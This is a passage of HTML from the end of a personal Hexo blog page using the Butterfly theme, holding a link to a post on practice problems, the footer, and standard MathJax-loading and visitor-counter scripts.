href="/2025/12/02/20251202%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20251202随缘刷题">20251202随缘刷题</a><time datetime="2025-12-01T16:26:54.000Z" title="发表于 2025-12-02 00:26:54">2025-12-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const loadMathjax = () => {
    if (!window.MathJax) {
      window.MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']],
          tags: 'none',
        },
        chtml: {
          scale: 1.1
        },
        options: {
          enableMenu: true,
          renderActions: {
            findScript: [10, doc => {
              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
                const display = !!node.type.match(/; *mode=display/)
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
                const text = document.createTextNode('')
                node.parentNode.replaceChild(text, node)
                math.start = {node: text, delim: '', n: 0}
                math.end = {node: text, delim: '', n: 0}
                doc.math.push(math)
              }
            }, '']
          }
        }
      }

      const script = document.createElement('script')
      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
      script.id = 'MathJax-script'
      script.async = true
      document.head.appendChild(script)
    } else {
      MathJax.startup.document.state(0)
      MathJax.texReset()
      MathJax.typesetPromise()
    }
  }

  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>